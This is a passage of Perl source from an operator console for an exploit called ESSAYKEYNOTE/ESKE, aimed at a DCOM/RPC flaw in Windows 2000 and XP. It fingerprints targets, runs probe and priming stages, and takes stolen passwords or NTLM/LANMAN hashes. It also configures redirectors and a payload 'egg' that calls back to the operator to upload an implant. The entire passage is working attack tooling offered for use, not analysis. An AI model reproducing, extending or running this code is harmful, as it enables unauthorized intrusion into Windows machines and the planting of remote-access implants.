					$EndPoint = $::ESSAYKEYNOTE_NAMED_PIPE_ENDPOINT;
					$attackPort = 139;
				}
				else
				{
				&EU_Log(1, "This Endpoint option is incompatible with target OS.  Please select again.");
				next;

				}
			}
			elsif($EndpointSelected eq  "2")
			{ 
				if($WindowsVersion == $::TARGET_VER_XP)
				{
					$EndPoint = $::ESSAYKEYNOTE_NAMED_PIPE_ENDPOINT;
					$attackPort = 445;
				}
				else
				{
					&EU_Log(1, "This Endpoint option is incompatible with target OS.  Please select again.");
					next;
				}
							
			}

			else 
			{
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} 




		
		my $probeFlag = "n";			
		
		$probeFlag = &EU_GetInput("\nUse ESSAYKEYNOTE Touch 1 to get Target Port and IPID ([y],n)? ", "y");
		my $probeError = 0;
		if(($probeFlag eq "y") or ($probeFlag eq "Y")) 
		{
			


			($attackPort, $IPID, $probeError) = &touch_tool($root_dir,$TargetIp,$TargetPort, $::RUN_PROBE_1, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcServerIp, $TimeOutValue, $WindowsVersion,$WindowsServicePack, $Domain, $Username, $Password, $NTHash, $LMHash, $attackPort, $EndPoint);

		}

		if($attackPort == 0) 
		{



			&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
			$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
			&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");

			if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
				&EU_ExitMessage(1,"User terminated script\n");
			}
			elsif( ($continue eq "n") or ($continue eq "N") ) {
				&EU_Log(1, "Returning to top of script...\n");
				next;
			}
			else { 
				$probeFlag = "N";
			}

		}


		if( $redirectFlag == 0 ) 
		{

			$attackPort = &EU_GetInput("\nEnter the Target port: [$attackPort] ", $attackPort);
			&EU_Log(0,"\tTarget Port: $attackPort");
			$DestinationPort = $attackPort;
			$TargetPort2 = $TargetPort; 
			$TargetPort = $attackPort;
		}
		else
		{	
			&EU_Log(1,"NOTE:  The exploit needs to be sent to port $attackPort on the target machine!!!");
			&EU_Log(1,"SINCE YOU ARE USING REDIRECTION YOU MUST SET UP THE REDIRECTOR FOR THIS PORT");
			if( $attackPort < 6500)
			{
				$LPRedirectionPort = ($attackPort * 10 + 1);
			}
			else
			{
				$LPRedirectionPort = ($attackPort  + 11);
			}
			$LPRedirectionPort = &EU_GetInput("\nEnter the Redirection port: [$LPRedirectionPort] ", $LPRedirectionPort);
			$DestinationPort = $attackPort;
			$TargetPort2 = $TargetPort;
			$TargetPort = $LPRedirectionPort;
			
			&EU_Log(0,"\tTarget Port: $LPRedirectionPort");
		}


		$IPID = &EU_GetInput("\nEnter the IPID: [$IPID] ", $IPID);
		&EU_Log(0,"\tIPID: $IPID");
	



		if($EndpointSelected eq "0") 
		{
			$TargetTransportProtocol	= $TransProt_tcp;
			$TransportProtocol			= "tcp";
			$TargetApplicationProtocol	= $AppProt_NA;
			$ApplicationProtocol		= "NA";
			$RpcConnection				= "-rpc";
		}
		elsif($EndpointSelected eq "1") 
		{
			$TargetTransportProtocol	= $TransProt_tcp;
			$TransportProtocol			= "tcp";
			$TargetApplicationProtocol	= $AppProt_nbt;
			$ApplicationProtocol		= "nbt";
			$RpcConnection				= "-rpc";
		}
		elsif($EndpointSelected eq "2") 
		{
			$TargetTransportProtocol	= $TransProt_tcp;
			$TransportProtocol			= "tcp";
			$TargetApplicationProtocol	= $AppProt_smb;
			$ApplicationProtocol		= "smb";
			$RpcConnection				= "-rpc";
		}

		&EU_Log(1,"\nConfirm Network Parameters:");
		&EU_Log(1,"\tRoot Directory        : $root_dir");
		&EU_Log(1,"\tLocal IP              : $LocalIp");
		&EU_Log(1,"\tPayload file          : $PayloadFile");
		&EU_Log(1,"\tPayload drop name     : $PayloadDropName");
		&EU_Log(1,"\tRideArea Option       : $RideAreaOpt");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection     : True");
			&EU_Log(1,"\tLP Redirector IP      : $LPRedirectionIp");
			&EU_Log(1,"\tLP Redirector Port    : $LPRedirectionPort");
		}
		else {
			&EU_Log(1,"\tUsing Redirection     : False");
		}
			&EU_Log(1,"\tTarget IP             : $DestinationIp");
			&EU_Log(1,"\tTarget Port           : $DestinationPort");
			&EU_Log(1,"\tRPC Server IP         : $RpcServerIp");

		if( $EggSocketStatus eq $::EGG_SOCKET_NEW ) {
			&EU_Log(1,"\tEgg Socket Status     : New");
			if( $redirectFlag ) {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp (Middle Redirector)");
			}
			else {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp");
			}
			&EU_Log(1,"\tEgg Callback Port     : $EggCallbackPort");
		}
		elsif( $EggSocketStatus eq $::EGG_SOCKET_REUSE ) {
			&EU_Log(1,"\tEgg Socket Status     : Reuse");
		}
		else {
			&EU_Log(1,"\tEgg Socket Status     : None");
		}

		if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
			&EU_Log(1,"\tExploit Socket Status : Maintain (Use existing connection for the entire operation.)");
		}
		else {
			&EU_Log(1,"\tExploit Socket Status : Close (Existing connection will NOT be used for the entire operation.)");
		}

 
		&EU_Log(1,"\tTransport Protocol    : $TransportProtocol");
		&EU_Log(1,"\tApplication Protocol  : $ApplicationProtocol");
		&EU_Log(1,"\tRpc Connection flag   : $RpcConnection");
		if($WindowsVersion == $::TARGET_VER_2K)
		{
			&EU_Log(1,"\tTarget OS             : Windows 2000");
		}
		elsif($WindowsVersion == $::TARGET_VER_XP)
		{
			&EU_Log(1,"\tTarget OS             : Windows XP");
			if($WindowsServicePack == $::SP_VER_01)
			{
				&EU_Log(1,"\tTarget OS Service Pack: 0 or 1");
			}
			elsif($WindowsServicePack == $::SP_VER_2)
			{
				&EU_Log(1,"\tTarget OS Service Pack: 2");
			}
		}
		&EU_Log(1,"\tDomain                : $Domain");
		&EU_Log(1,"\tUsername              : $Username");
		&EU_Log(1,"\tPassword              : $Password");
		&EU_Log(1,"\tIPID                  : $IPID");
		&EU_Log(1,"\tTime OutValue         : $TimeOutValue sec");


		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
			last;
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}

	} 

	if($WindowsVersion == $::TARGET_VER_XP and $WindowsServicePack == $::SP_VER_2)
	{
		my $handle = new FileHandle;

		while(1)
		{
			&EU_Log(1,"\n\nSince the target is an XP service pack 2 machine.  The target must be primed" .
			" before the exploit can be launched. This is a two step process:\n\n" .
			"\tFirst, you must activate another DCOM object and get its associated IPID\n" .
			"\tSecond, a specially crafted packet must be sent.\n\n");
				
			my $probeFlag = "n";			
			my $IPID_2 = "0123456789abcdef0123456789abcdef";
				&EU_Log(1,"\tNOTE: The following request is being sent to port: $TargetPort2");
			$probeFlag = &EU_GetInput("\nUse ESSAYKEYNOTE Touch 2 to get Target Port and IPID ([y],n)? ", "y");


			my $probeError = 0;
			if(($probeFlag eq "y") or ($probeFlag eq "Y")) 
			{


				($attackPort2, $IPID_2, $probeError) = &touch_tool($root_dir,$TargetIp,$TargetPort2, $::RUN_PROBE_2, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcServerIp, $TimeOutValue, $WindowsVersion,$WindowsServicePack, $Domain, $Username, $Password, $NTHash, $LMHash, $attackPort, $EndPoint);

			}
			elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
			}
			else {
				&EU_Log(1, "Returning to top of script...\n");
				next;
			}


			if($attackPort2 == 0) 
			{


				&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
				$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
				&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");

				if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
					&EU_ExitMessage(1,"User terminated script\n");
				}
				elsif( ($continue eq "n") or ($continue eq "N") ) {
					&EU_Log(1, "Returning to top of script...\n");
					next;
				}
				else { 
					$probeFlag = "N";
				}

			}


			if( $redirectFlag == 0 ) 
			{

				$attackPort = &EU_GetInput("\nEnter the Target port: [$attackPort] ", $attackPort);
				&EU_Log(0,"\tTarget Port: $attackPort");
				$DestinationPort = $attackPort2;
				$TargetPort2 = $attackPort2;
			}
			else
			{	
				&EU_Log(1,"NOTE:  The exploit needs to be sent to port $attackPort on the target machine!!!");
				&EU_Log(1,"SINCE YOU ARE USING REDIRECTION YOU MUST SET UP THE REDIRECTOR FOR THIS PORT");
				if( $attackPort < 6500)
				{
					$LPRedirectionPort = ($attackPort * 10 + 1);
				}
				else
				{
					$LPRedirectionPort = ($attackPort  + 11);
				}
				$LPRedirectionPort = &EU_GetInput("\nEnter the Redirection port: [$LPRedirectionPort] ", $LPRedirectionPort);
				$DestinationPort = $attackPort;
				$TargetPort = $LPRedirectionPort;
				&EU_Log(0,"\tTarget Port: $LPRedirectionPort");
			}


			$IPID_2 = &EU_GetInput("\nEnter the IPID: [$IPID_2] ", $IPID_2);
			&EU_Log(0,"\tIPID: $IPID_2");

		
			$probeFlag = &EU_GetInput("\nUse ESSAYKEYNOTE Touch 3 to prime target ([y],n)? ", "y");

			my $probeError = 0;
			if(($probeFlag eq "y") or ($probeFlag eq "Y")) 
			{
				my $cmdline = "\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_PROBE_3 -i $TargetIp -p $TargetPort  -t $TargetTransportProtocol -b $TargetApplicationProtocol -h $RpcServerIp -o $TimeOutValue -w $WindowsVersion -S $WindowsServicePack -M $Domain -U $Username -W $Password -N $NTHash -L $LMHash -E $EndPoint -D $IPID_2";
				&EU_Log(0, "$cmdline");

				&EU_Log(1, "Priming target...");
				if(!open($handle, "$cmdline|")) 
				{
					&EU_ExitMessage(1, "$::RUN_PROBE_3");
				}
				close $handle;
				&EU_Log(1, "Probing target complete.");

			}
			elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) 
			{
				&EU_ExitMessage(1,"User terminated script\n");
			}
			else 
			{
				&EU_Log(1, "Returning to top of script...\n");
				next;
			}
			last;
		} 

	} 


	return ($TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, 
			$PayloadDropName, $TimeOutValue,
	        $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection,
			$EggCallbackIp, $EggCallbackPort,$Username, $Password, $NTHash, $LMHash,$ExternalRideArea,$IPID, $WindowsVersion, 
			$WindowsServicePack,$RpcServerIp);
}



sub get_auth() {

	my ($Username, $Password, $NTHash, $LMHash, $UsingPassword) = @_;

	&EU_Log(1,"\nUsername/Password option:\n");
	&EU_Log(1,"   0) Use anonymous access (No username or password)[DEFAULT]");		
	&EU_Log(1,"   1) Supply a username and password \n\t(Only needed if anon.access is denied or XPSP2)");
	&EU_Log(1,"   2) Supply a username and NTLM and LANMAN password hash \n\t(Only needed if anon. access is denied or XPSP2)");
	while(1) {
		$UsingPassword = &EU_GetInput("\nEnter selection [$UsingPassword]: ", $UsingPassword);
		&EU_Log(0, "\nEnter selection [$UsingPassword]: $UsingPassword");

		if($UsingPassword eq  "0")
		{
			; 
		}
		elsif($UsingPassword eq  "1")
		{ 
			$Domain = &EU_GetInput("\nEnter Domain[$Domain : Set NULL to log onto local machine]: ", $Domain);
			&EU_Log(0, "\nEnter Domain[NULL : Set NULL to log onto local machine]: $Domain");

			$Username = &EU_GetInput("\nEnter Username[$Username]: ", $Username);
			&EU_Log(0, "\nEnter Username[NULL]: $Username");
			$Password = &EU_GetInput("\nEnter Password [$Password]: ", $Password);
			&EU_Log(0, "\nEnter Password [NULL]: $Password");
		}
		elsif($UsingPassword eq  "2")
		{ 
			$Domain = &EU_GetInput("\nEnter Domain[$Domain : Set NULL to log onto local machine]: ", $Domain);
			&EU_Log(0, "\nEnter Domain[NULL : Set NULL to log onto local machine]: $Domain");

			$Username = &EU_GetInput("\nEnter Username[$Username]: ", $Username);
			&EU_Log(0, "\nEnter Username[NULL]: $Username");
			
			$LMHash = &EU_GetInput("\nEnter LANMAN password hash [$LMHash]: ", $LMHash);
			&EU_Log(0, "\nEnter LANMAN password hash [$LMHash]:  $LMHash");

			$NTHash = &EU_GetInput("\nEnter NTLM password hash [$NTHash]: ", $NTHash);
			&EU_Log(0, "\nEnter NTLM password hash [$NTHash]:  $NTHash");

			$Password = "FakePassword";
		}
		else 
		{
			&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
			next;
		}
		last;
	} 

	return($Username, $Password, $NTHash, $LMHash, $UsingPassword);
}



sub touch_tool() {

	my ($root_dir, $TargetIp, $TargetPort, $RunOption, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcServerIp, $TimeOutValue,$WindowsVersion,$WindowsServicePack, $Domain, $Username, $Password, $NTHash, $LMHash, $attackPort, $EndPoint) = @_;
	my $handle = new FileHandle;

	my $ProbeError = 0;			
    my $IPID = "00112233445566778899";
	
	my $cmdline = "\"$root_dir\\$::EXPLOIT_EXE\" -r $RunOption -i $TargetIp -p $TargetPort  -t $TargetTransportProtocol -b $TargetApplicationProtocol -h $RpcServerIp -o $TimeOutValue -w $WindowsVersion -S $WindowsServicePack -M $Domain -U $Username -W $Password -N $NTHash -L $LMHash -E $EndPoint";
	&EU_Log(0, "$cmdline");

	&EU_Log(0, "Probing target...");
	if(!open($handle, "$cmdline|")) {
		&EU_ExitMessage(1, "$::RUN_PROBE_1");
	}

	my $junk;
	my $line;
	my $success = 0;

	if( $RunOption eq $::RUN_PROBE_1 or $RunOption eq $::RUN_PROBE_2 ) 
	{
		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
			}
			elsif($line =~ /The activated SENS COM object can be reached on port/) {
				
				if($attackPort == 0)
				{
					(my $nonsense, $attackPort) = split (/:/, $line);
				}
			
			}
			elsif($line =~ /The required IPID/) {
				(my $nonsense, $IPID) = split (/:/, $line);
				
			}
			
		}
		return($attackPort,$IPID,$ProbeError);
	}



	if( $RunOption eq $::RUN_PROBE_4 ) 
	{
		while(<$handle>) 
		{
			
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Windows XP SP2/) {
				$WindowsVersion = $::TARGET_VER_XP;
				$WindowsServicePack = $::SP_VER_2;
			}
			elsif($line =~ /SP1 and below/) {
				$WindowsVersion = $::TARGET_VER_XP;
				$WindowsServicePack = $::SP_VER_01;
			}
			
		}

		return($WindowsVersion, $WindowsServicePack, $ProbeError);
	}
}




sub launch_rpctouchii() {
	my ($root_dir, $TargetIp, $TargetPort, $RunOption, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcServerIp, $TimeOutValue,$WindowsVersion, $WindowsServicePack) = @_;
	my $handle = new FileHandle;


	my $ProbeError = 0;			


	my $cmdline = "\"$root_dir\\$::RPCTOUCHII\" -i $TargetIp -p $TargetPort -r $RunOption -t $TargetTransportProtocol -b $TargetApplicationProtocol -h $RpcServerIp -o $TimeOutValue";
	&EU_Log(0, "$cmdline");

	&EU_Log(0, "Probing target...");
	if(!open($handle, "$cmdline|")) {
		&EU_ExitMessage(1, "Unable to execute $::REGPROBE");
	}

	my $junk;
	my $line;
	my $success = 0;

	if( $RunOption eq $RPCTOUCHII_RUN_GENERAL_PROBE ) {		

		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like UNKNOWN Windows version/) {
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like Windows 9x/) {
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like Windows NT 4.0/) {
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like Windows 2000/) {
				$WindowsVersion = $::TARGET_VER_2K;
			}
			elsif($line =~ /Looks like Windows XP Service Pack 2/) {
				$WindowsVersion = $::TARGET_VER_XP;
				$WindowsServicePack = $::SP_VER_2;
			}
			elsif($line =~ /Looks like Windows XP/) {
				$WindowsVersion = $::TARGET_VER_XP;
			}
			elsif($line =~ /Looks like Windows Server 2003/) {
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like Windows 2003/) {
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like either Windows XP or Windows Server 2003/) {
				$WindowsVersion = $::TARGET_VER_XP;
			}
			elsif($line =~ /Looks like it might be Windows XP Service Pack 2/) {
				$WindowsVersion = $::TARGET_VER_XP;
				$WindowsServicePack = $::SP_VER_2;
			}

		}
	}

	elsif( $RunOption eq $RPCTOUCHII_RUN_WINDOWS_2003_PROBE ) {	

		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like UNKNOWN Windows version/) {
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like Windows 9x/) {
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like Windows NT 4.0/) {
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like Windows 2000/) {
				$WindowsVersion = $::TARGET_VER_2K;
			}
			elsif($line =~ /Looks like Windows XP/) {
				$WindowsVersion = $::TARGET_VER_XP;
				$WindowsServicePack = $::SP_VER_01;
			}
			elsif($line =~ /Looks like Windows Server 2003/) {
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like Windows 2003/) {
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like either Windows XP or Windows Server 2003/) {
				$WindowsVersion = $::TARGET_VER_XP;
			}
		}
	}
	return($WindowsVersion, $WindowsServicePack, $ProbeError);
}



sub get_socket_options()
{
	my ($ImplantSocketStatus, $EggSocketStatus, 
	    $PayloadType) = @_;

	my $opt;
	my $EggSocketOption0	= "Re-use existing socket connection";
	my $EggSocketOption1	= "Create a new socket connection";
	my $ImplantSocketOption	= "Maintain this socket for the Implant ".
	                          "connection with the LP";
	


    
	&EU_Log(1,"\nThe ESKE Exploit Payload Must Call-back in Order to Upload the ".
		      "Implant Payload.");
	&EU_Log(1,"Select the Socket Option To Use:\n\nNOTE: OPTION 0 CAN NOT BE USED AGAINST ".
	"WINDOWS XP SERVICE PACK 2 TARGETS \n\n");
	&EU_Log(1,"   0) $EggSocketOption0 ");		
	&EU_Log(1,"   1) $EggSocketOption1");		
	while(1) 
	{
		$opt = &EU_GetInput("\nEnter selection [1]: ", "1");
		&EU_Log(0, "\nEnter selection [1]: $opt");

		if ($opt eq "0") 
		{
			$EggSocketStatus = $::EGG_SOCKET_REUSE;
		}
		elsif($opt eq "1") 
		{
			$EggSocketStatus = $::EGG_SOCKET_NEW;
		}
		else 
		{
			&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
			next;
		}
		last;
	}  
	


	$ImplantSocketStatus = $::IMPLANT_SOCKET_NEW;

	if($PayloadType eq "d") 
	{
		if($EggSocketStatus eq $::EGG_SOCKET_NEW) 
		{
			$opt = &EU_GetInput("\n$ImplantSocketOption ([y],n)? ", "y");
			&EU_Log(0, "\n$ImplantSocketOption ([y],n)?  $opt");
			if( $opt eq "y" or $opt eq "Y" or  $opt eq "yes" or $opt eq "YES" ) 
			{
				$ImplantSocketStatus = $::IMPLANT_SOCKET_MAINTAIN;
			}
		}
		else 
		{
			&EU_Log(1,"\nWhen re-using existing socket connection, the implant must use a");
			&EU_Log(1,"new connection.");
		}
	}
	return ($ImplantSocketStatus, $EggSocketStatus);
}


__END__



